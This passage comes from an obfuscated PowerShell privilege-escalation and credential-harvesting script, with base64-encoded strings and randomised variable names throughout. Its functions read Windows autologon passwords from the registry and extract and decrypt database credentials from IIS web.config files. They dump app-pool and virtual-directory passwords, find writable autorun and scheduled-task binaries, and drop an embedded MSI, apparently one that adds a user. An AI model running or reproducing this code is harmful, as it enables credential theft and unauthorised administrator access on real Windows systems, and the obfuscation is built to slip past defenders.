        ${a69d9d72c16e4adfa6510a0004b8dee6} = $(gp -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAFcAaQBuAGwAbwBnAG8AbgA='))) -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        ${654f216eef0d4033b53940e497791296} = $(gp -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAFcAaQBuAGwAbwBnAG8AbgA='))) -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword
        if (${37ec27760c9543068870e8b7a40076fb} -or ${a69d9d72c16e4adfa6510a0004b8dee6}) {            
            ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject 
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGYAYQB1AGwAdABEAG8AbQBhAGkAbgBOAGEAbQBlAA=='))) ${1a3b401732c541eda7dfe519bec9bed4}
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGYAYQB1AGwAdABVAHMAZQByAE4AYQBtAGUA'))) ${37ec27760c9543068870e8b7a40076fb}
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGYAYQB1AGwAdABQAGEAcwBzAHcAbwByAGQA'))) ${6702e45622bd41a8a3d84b0b3f1b2340}
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAHQARABlAGYAYQB1AGwAdABEAG8AbQBhAGkAbgBOAGEAbQBlAA=='))) ${dd34dac698824e0599596241032b9e26}
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAHQARABlAGYAYQB1AGwAdABVAHMAZQByAE4AYQBtAGUA'))) ${a69d9d72c16e4adfa6510a0004b8dee6}
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAHQARABlAGYAYQB1AGwAdABQAGEAcwBzAHcAbwByAGQA'))) ${654f216eef0d4033b53940e497791296}
            ${3511249d1e9f43519714ca9c156d8f53}
        }
    }
}   
function Get-VulnAutoRun {
    [CmdletBinding()]Param()
    ${585b3db13d1d47519785d5228ee78bfe} = @(   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4A'))),
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4ATwBuAGMAZQA='))),
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAVwBvAHcANgA0ADMAMgBOAG8AZABlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4A'))),
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAVwBvAHcANgA0ADMAMgBOAG8AZABlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4ATwBuAGMAZQA='))),
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AUwBlAHIAdgBpAGMAZQA='))),
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4ATwBuAGMAZQBTAGUAcgB2AGkAYwBlAA=='))),
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAVwBvAHcANgA0ADMAMgBOAG8AZABlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AUwBlAHIAdgBpAGMAZQA='))),
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAVwBvAHcANgA0ADMAMgBOAG8AZABlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4ATwBuAGMAZQBTAGUAcgB2AGkAYwBlAA==')))
                        )
    ${e12e52497f734f1388f7943a3bbbb324} = $ErrorActionPreference
    $ErrorActionPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
    ${585b3db13d1d47519785d5228ee78bfe} | ? { Test-Path $_ } | % {
        ${84f8789a7aa14315849e0650b74a1b9d} = gi -Path $_
        ${fd0e96020aba4e77bb09201bd185353f} = $_
        ForEach ($Name in ${84f8789a7aa14315849e0650b74a1b9d}.GetValueNames()) {
            ${d3bfda1f12f74d9da143c7e63466c346} = $(${84f8789a7aa14315849e0650b74a1b9d}.GetValue($Name))
            ${d3bfda1f12f74d9da143c7e63466c346} | Get-ModifiableFile | % {
                ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject 
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHkA'))) "${fd0e96020aba4e77bb09201bd185353f}\$Name"
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) ${d3bfda1f12f74d9da143c7e63466c346}
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAGQAaQBmAGkAYQBiAGwAZQBGAGkAbABlAA=='))) $_
                ${3511249d1e9f43519714ca9c156d8f53}
            }
        }
    }
    $ErrorActionPreference = ${e12e52497f734f1388f7943a3bbbb324}
}
function Get-VulnSchTask {
    [CmdletBinding()]Param()
    ${e12e52497f734f1388f7943a3bbbb324} = $ErrorActionPreference
    $ErrorActionPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
    ${d3bfda1f12f74d9da143c7e63466c346} = "$($ENV:windir)\System32\Tasks"
    ls -Path ${d3bfda1f12f74d9da143c7e63466c346} -Recurse | ? { ! $_.PSIsContainer } | % {
        ${a6deb520a9524e6cbb0e20b4dbbb2ed0} = $_.Name
        ${c9fd84d02def4555a95ba248d37f21dd} = [xml] (gc $_.FullName)
        ${c525137dda924f2e9f937c4104dab493} = ${c9fd84d02def4555a95ba248d37f21dd}.Task.Triggers.OuterXML
        ${c9fd84d02def4555a95ba248d37f21dd}.Task.Actions.Exec.Command | Get-ModifiableFile | % {
            ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject 
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHMAawBOAGEAbQBlAA=='))) ${a6deb520a9524e6cbb0e20b4dbbb2ed0}
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHMAawBGAGkAbABlAFAAYQB0AGgA'))) $_
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHMAawBUAHIAaQBnAGcAZQByAA=='))) ${c525137dda924f2e9f937c4104dab493}
            ${3511249d1e9f43519714ca9c156d8f53}
        }
        ${c9fd84d02def4555a95ba248d37f21dd}.Task.Actions.Exec.Arguments | Get-ModifiableFile | % {
            ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject 
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHMAawBOAGEAbQBlAA=='))) ${a6deb520a9524e6cbb0e20b4dbbb2ed0}
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHMAawBGAGkAbABlAFAAYQB0AGgA'))) $_
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHMAawBUAHIAaQBnAGcAZQByAA=='))) ${c525137dda924f2e9f937c4104dab493}
            ${3511249d1e9f43519714ca9c156d8f53}
        }
    }
    $ErrorActionPreference = ${e12e52497f734f1388f7943a3bbbb324}
}
function Get-UnattendedInstallFile {
    ${e12e52497f734f1388f7943a3bbbb324} = $ErrorActionPreference
    $ErrorActionPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
    ${585b3db13d1d47519785d5228ee78bfe} = @(   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwA6AFwAcwB5AHMAcAByAGUAcABcAHMAeQBzAHAAcgBlAHAALgB4AG0AbAA='))),
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwA6AFwAcwB5AHMAcAByAGUAcABcAHMAeQBzAHAAcgBlAHAALgBpAG4AZgA='))),
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwA6AFwAcwB5AHMAcAByAGUAcAAuAGkAbgBmAA=='))),
                            (Join-Path $Env:WinDir $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAGEAbgB0AGgAZQByAFwAVQBuAGEAdAB0AGUAbgBkAGUAZAAuAHgAbQBsAA==')))),
                            (Join-Path $Env:WinDir $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAGEAbgB0AGgAZQByAFwAVQBuAGEAdAB0AGUAbgBkAFwAVQBuAGEAdAB0AGUAbgBkAGUAZAAuAHgAbQBsAA==')))),
                            (Join-Path $Env:WinDir $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAGEAbgB0AGgAZQByAFwAVQBuAGEAdAB0AGUAbgBkAC4AeABtAGwA')))),
                            (Join-Path $Env:WinDir $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAGEAbgB0AGgAZQByAFwAVQBuAGEAdAB0AGUAbgBkAFwAVQBuAGEAdAB0AGUAbgBkAC4AeABtAGwA')))),
                            (Join-Path $Env:WinDir $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAHkAcwB0AGUAbQAzADIAXABTAHkAcwBwAHIAZQBwAFwAdQBuAGEAdAB0AGUAbgBkAC4AeABtAGwA')))),
                            (Join-Path $Env:WinDir $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAHkAcwB0AGUAbQAzADIAXABTAHkAcwBwAHIAZQBwAFwAUABhAG4AdABoAGUAcgBcAHUAbgBhAHQAdABlAG4AZAAuAHgAbQBsAA=='))))
                        )
    ${585b3db13d1d47519785d5228ee78bfe} | ? { Test-Path $_ } | % {
        ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject 
        ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAdAB0AGUAbgBkAFAAYQB0AGgA'))) $_
        ${3511249d1e9f43519714ca9c156d8f53}
    }
    $ErrorActionPreference = ${e12e52497f734f1388f7943a3bbbb324}
}
function Get-Webconfig {   
    [CmdletBinding()]Param()
    ${e12e52497f734f1388f7943a3bbbb324} = $ErrorActionPreference
    $ErrorActionPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
    if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {
        ${d1496606b8924faf9d294382e4500b30} = New-Object System.Data.DataTable 
        $Null = ${d1496606b8924faf9d294382e4500b30}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA='))))
        $Null = ${d1496606b8924faf9d294382e4500b30}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABhAHMAcwA='))))  
        $Null = ${d1496606b8924faf9d294382e4500b30}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABiAHMAZQByAHYA'))))
        $Null = ${d1496606b8924faf9d294382e4500b30}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBkAGkAcgA='))))
        $Null = ${d1496606b8924faf9d294382e4500b30}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABhAHQAaAA='))))
        $Null = ${d1496606b8924faf9d294382e4500b30}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBuAGMAcgA='))))
        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath | 
        % { 
            ${cedb223f3fea457f9f58b65a4b1a9dd5} = $_
            if ($_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAlACoA')))) {            
                ${5ea4f3c15b184687b964d3f562b24da8} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABFAG4AdgA6AA==')))+$_.split("%")[1]
                ${3a9b24cf024d496abdb1c1a9ea0d88e0} = iex ${5ea4f3c15b184687b964d3f562b24da8}
                ${5fdd7cfd97f640cfadc46d817a65da68} = $_.split("%")[2]            
                ${cedb223f3fea457f9f58b65a4b1a9dd5}  = ${3a9b24cf024d496abdb1c1a9ea0d88e0}+${5fdd7cfd97f640cfadc46d817a65da68}
            }
            ${cedb223f3fea457f9f58b65a4b1a9dd5} | ls -Recurse -Filter web.config | % {
                ${daf1caa77f284c7ba52c9caab8e23bc5} = $_.fullname
                [xml]$ConfigFile = gc $_.fullname
                if ($ConfigFile.configuration.connectionStrings.add) {
                    $ConfigFile.configuration.connectionStrings.add| 
                    % {
                        [String]$MyConString = $_.connectionString
                        if($MyConString -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA=')))) {
                            ${42f7517dbe7844d78f71a614d8a7601d} = $MyConString.Split("=")[3].Split(";")[0]
                            ${7e18c233dd384a34a8f8eead3a5798d7} = $MyConString.Split("=")[4].Split(";")[0]
                            ${37d465435d4b462792807a11b5b0285b} = $MyConString.Split("=")[1].Split(";")[0]
                            ${dc7e30ef820d459c88593465ba32d31f} = ${cedb223f3fea457f9f58b65a4b1a9dd5}
                            ${4467d37a2fb6406bbc8b2ae49bd9600f} = ${daf1caa77f284c7ba52c9caab8e23bc5}
                            ${b3b0469422cc4a8b8f4e1186377ac9ac} = "No"
                            $Null = ${d1496606b8924faf9d294382e4500b30}.Rows.Add(${42f7517dbe7844d78f71a614d8a7601d}, ${7e18c233dd384a34a8f8eead3a5798d7}, ${37d465435d4b462792807a11b5b0285b},${dc7e30ef820d459c88593465ba32d31f},${daf1caa77f284c7ba52c9caab8e23bc5}, ${b3b0469422cc4a8b8f4e1186377ac9ac})
                        }
                    }  
                }
                else {
                    ${7be3d009f60545afa93d213c851c0e4d} = ls -Recurse -filter aspnet_regiis.exe c:\Windows\Microsoft.NET\Framework\ | sort -Descending | select fullname -First 1
                    if (Test-Path  (${7be3d009f60545afa93d213c851c0e4d}.FullName)){
                        ${005c3a911d74461ab716e3c352c9f009} = (gi $Env:temp).FullName + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAB3AGUAYgAuAGMAbwBuAGYAaQBnAA==')))
                        if (Test-Path  (${005c3a911d74461ab716e3c352c9f009})) 
                        { 
                            rd ${005c3a911d74461ab716e3c352c9f009} 
                        }
                        cp ${daf1caa77f284c7ba52c9caab8e23bc5} ${005c3a911d74461ab716e3c352c9f009}
                        ${399d1eddd16d4a3f830f30ab06a682b6} = ${7be3d009f60545afa93d213c851c0e4d}.fullname+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtAHAAZABmACAAIgBjAG8AbgBuAGUAYwB0AGkAbwBuAFMAdAByAGkAbgBnAHMAIgAgACgAZwBlAHQALQBpAHQAZQBtACAAJABFAG4AdgA6AHQAZQBtAHAAKQAuAEYAdQBsAGwATgBhAG0AZQA=')))
                        $Null = iex ${399d1eddd16d4a3f830f30ab06a682b6}
                        [xml]$TMPConfigFile = gc ${005c3a911d74461ab716e3c352c9f009}
                        if ($TMPConfigFile.configuration.connectionStrings.add)
                        {
                            $TMPConfigFile.configuration.connectionStrings.add | % {
                                [String]$MyConString = $_.connectionString
                                if($MyConString -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA=')))) {
                                    ${42f7517dbe7844d78f71a614d8a7601d} = $MyConString.Split("=")[3].Split(";")[0]
                                    ${7e18c233dd384a34a8f8eead3a5798d7} = $MyConString.Split("=")[4].Split(";")[0]
                                    ${37d465435d4b462792807a11b5b0285b} = $MyConString.Split("=")[1].Split(";")[0]
                                    ${dc7e30ef820d459c88593465ba32d31f} = ${cedb223f3fea457f9f58b65a4b1a9dd5}
                                    ${4467d37a2fb6406bbc8b2ae49bd9600f} = ${daf1caa77f284c7ba52c9caab8e23bc5}
                                    ${b3b0469422cc4a8b8f4e1186377ac9ac} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                                    $Null = ${d1496606b8924faf9d294382e4500b30}.Rows.Add(${42f7517dbe7844d78f71a614d8a7601d}, ${7e18c233dd384a34a8f8eead3a5798d7}, ${37d465435d4b462792807a11b5b0285b},${dc7e30ef820d459c88593465ba32d31f},${daf1caa77f284c7ba52c9caab8e23bc5}, ${b3b0469422cc4a8b8f4e1186377ac9ac})
                                }
                            }  
                        }else{
                            Write-Verbose "Decryption of ${daf1caa77f284c7ba52c9caab8e23bc5} failed."
                            $False                      
                        }
                    }else{
                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBzAHAAbgBlAHQAXwByAGUAZwBpAGkAcwAuAGUAeABlACAAZABvAGUAcwAgAG4AbwB0ACAAZQB4AGkAcwB0ACAAaQBuACAAdABoAGUAIABkAGUAZgBhAHUAbAB0ACAAbABvAGMAYQB0AGkAbwBuAC4A')))
                        $False
                    }
                }           
            }
        }
        if( ${d1496606b8924faf9d294382e4500b30}.rows.Count -gt 0 ) {
            ${d1496606b8924faf9d294382e4500b30} |  sort user,pass,dbserv,vdir,path,encr | select user,pass,dbserv,vdir,path,encr -Unique       
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAYwBvAG4AbgBlAGMAdABpAG8AbgBTAHQAcgBpAG4AZwBzACAAZgBvAHUAbgBkAC4A')))
            $False
        }     
    }
    else {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAYwBtAGQALgBlAHgAZQAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAgAGkAbgAgAHQAaABlACAAZABlAGYAYQB1AGwAdAAgAGwAbwBjAGEAdABpAG8AbgAuAA==')))
        $False
    }
    $ErrorActionPreference = ${e12e52497f734f1388f7943a3bbbb324}
}
function Get-ApplicationHost {
    ${e12e52497f734f1388f7943a3bbbb324} = $ErrorActionPreference
    $ErrorActionPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe"))
    {
        ${d1496606b8924faf9d294382e4500b30} = New-Object System.Data.DataTable 
        $Null = ${d1496606b8924faf9d294382e4500b30}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA='))))
        $Null = ${d1496606b8924faf9d294382e4500b30}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABhAHMAcwA='))))  
        $Null = ${d1496606b8924faf9d294382e4500b30}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAB5AHAAZQA='))))
        $Null = ${d1496606b8924faf9d294382e4500b30}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBkAGkAcgA='))))
        $Null = ${d1496606b8924faf9d294382e4500b30}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBwAHAAcABvAG8AbAA='))))
        iex "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | % { 
            ${fca6badca97f479e96bd18343d1b320d} = $_
            ${cf1554d9da9c4e9e8ab23b5bf2898c29} = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"${fca6badca97f479e96bd18343d1b320d}`" /text:processmodel.username"
            ${96596d587d314ca586684c272ad64fed} = iex ${cf1554d9da9c4e9e8ab23b5bf2898c29} 
            ${c4bc9bab310442a8b884fa098ba7d0f6} = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"${fca6badca97f479e96bd18343d1b320d}`" /text:processmodel.password"
            ${8e019f6537834396b6c311e93b53e323} = iex ${c4bc9bab310442a8b884fa098ba7d0f6} 
            if ((${8e019f6537834396b6c311e93b53e323} -ne "") -and (${8e019f6537834396b6c311e93b53e323} -isnot [system.array]))
            {
                $Null = ${d1496606b8924faf9d294382e4500b30}.Rows.Add(${96596d587d314ca586684c272ad64fed}, ${8e019f6537834396b6c311e93b53e323},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAbABpAGMAYQB0AGkAbwBuACAAUABvAG8AbAA='))),'NA',${fca6badca97f479e96bd18343d1b320d}) 
            }
        }
        iex "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | % { 
            ${261b01cddc0e48229add91ddd9a97d29} = $_
            ${e0c21f99f0384da7aa293b00b723eee3} = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"${261b01cddc0e48229add91ddd9a97d29}`" /text:userName"
            ${2cc1c20596eb44cead9a49589d85fbd0} = iex ${e0c21f99f0384da7aa293b00b723eee3}
            ${7b682786a23a49ee856ddbb224d3ce72} = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"${261b01cddc0e48229add91ddd9a97d29}`" /text:password"
            ${2ea36c3af5c248e1acfe16934607429c} = iex ${7b682786a23a49ee856ddbb224d3ce72}
            if ((${2ea36c3af5c248e1acfe16934607429c} -ne "") -and (${2ea36c3af5c248e1acfe16934607429c} -isnot [system.array]))
            {
                $Null = ${d1496606b8924faf9d294382e4500b30}.Rows.Add(${2cc1c20596eb44cead9a49589d85fbd0}, ${2ea36c3af5c248e1acfe16934607429c},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbAAgAEQAaQByAGUAYwB0AG8AcgB5AA=='))),${261b01cddc0e48229add91ddd9a97d29},'NA')
            }
        }
        if( ${d1496606b8924faf9d294382e4500b30}.rows.Count -gt 0 ) {
            ${d1496606b8924faf9d294382e4500b30} |  sort type,user,pass,vdir,apppool | select user,pass,type,vdir,apppool -Unique       
        }
        else{
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAYQBwAHAAbABpAGMAYQB0AGkAbwBuACAAcABvAG8AbAAgAG8AcgAgAHYAaQByAHQAdQBhAGwAIABkAGkAcgBlAGMAdABvAHIAeQAgAHAAYQBzAHMAdwBvAHIAZABzACAAdwBlAHIAZQAgAGYAbwB1AG4AZAAuAA==')))
            $False
        }     
    }else{
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAYwBtAGQALgBlAHgAZQAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAgAGkAbgAgAHQAaABlACAAZABlAGYAYQB1AGwAdAAgAGwAbwBjAGEAdABpAG8AbgAuAA==')))
        $False
    }
    $ErrorActionPreference = ${e12e52497f734f1388f7943a3bbbb324}
}
function Write-UserAddMSI {
    ${d3bfda1f12f74d9da143c7e63466c346} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAZAAuAG0AcwBpAA==')))
    ${c7ec2c9415df4ba1b7f00bbb590355e9} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MABN...2AA=='))) # The omitted 'MABN...2AA==' is actually a 742852 character long Base64 string.
    try {
        [System.Convert]::FromBase64String( ${c7ec2c9415df4ba1b7f00bbb590355e9} ) | sc -Path ${d3bfda1f12f74d9da143c7e63466c346} -Encoding Byte
        Write-Verbose "MSI written out to '${d3bfda1f12f74d9da143c7e63466c346}'"
        ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject 
        ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAUABhAHQAaAA='))) ${d3bfda1f12f74d9da143c7e63466c346}
        ${3511249d1e9f43519714ca9c156d8f53}
    }
    catch {
        Write-Warning "Error while writing to location '${d3bfda1f12f74d9da143c7e63466c346}': $_"
        ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject 
        ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAUABhAHQAaAA='))) $_
        ${3511249d1e9f43519714ca9c156d8f53}
    }
}
function Invoke-AllChecks {
    [CmdletBinding()]
    Param(
        [Switch]
        ${d837db923d964094a7e6388d293f3ffb}
    )
    if(${d837db923d964094a7e6388d293f3ffb}) {
        ${06624c64d6b6454faaf3a33761220926} = "$($Env:ComputerName).$(${Env:a913b56191f84144ba519b305233ff1d}).html"
        ${f83b72547af34fd69ef35f2002908a4b} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABzAHQAeQBsAGUAPgA=')))
        ${f83b72547af34fd69ef35f2002908a4b} = ${f83b72547af34fd69ef35f2002908a4b} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBPAEQAWQB7AGIAYQBjAGsAZwByAG8AdQBuAGQALQBjAG8AbABvAHIAOgBwAGUAYQBjAGgAcAB1AGYAZgA7AH0A')))
        ${f83b72547af34fd69ef35f2002908a4b} = ${f83b72547af34fd69ef35f2002908a4b} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABBAEIATABFAHsAYgBvAHIAZABlAHIALQB3AGkAZAB0AGgAOgAgADEAcAB4ADsAYgBvAHIAZABlAHIALQBzAHQAeQBsAGUAOgAgAHMAbwBsAGkAZAA7AGIAbwByAGQAZQByAC0AYwBvAGwAbwByADoAIABiAGwAYQBjAGsAOwBiAG8AcgBkAGUAcgAtAGMAbwBsAGwAYQBwAHMAZQA6ACAAYwBvAGwAbABhAHAAcwBlADsAfQA=')))
        ${f83b72547af34fd69ef35f2002908a4b} = ${f83b72547af34fd69ef35f2002908a4b} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABIAHsAYgBvAHIAZABlAHIALQB3AGkAZAB0AGgAOgAgADEAcAB4ADsAcABhAGQAZABpAG4AZwA6ACAAMABwAHgAOwBiAG8AcgBkAGUAcgAtAHMAdAB5AGwAZQA6ACAAcwBvAGwAaQBkADsAYgBvAHIAZABlAHIALQBjAG8AbABvAHIAOgAgAGIAbABhAGMAawA7AGIAYQBjAGsAZwByAG8AdQBuAGQALQBjAG8AbABvAHIAOgB0AGgAaQBzAHQAbABlAH0A')))
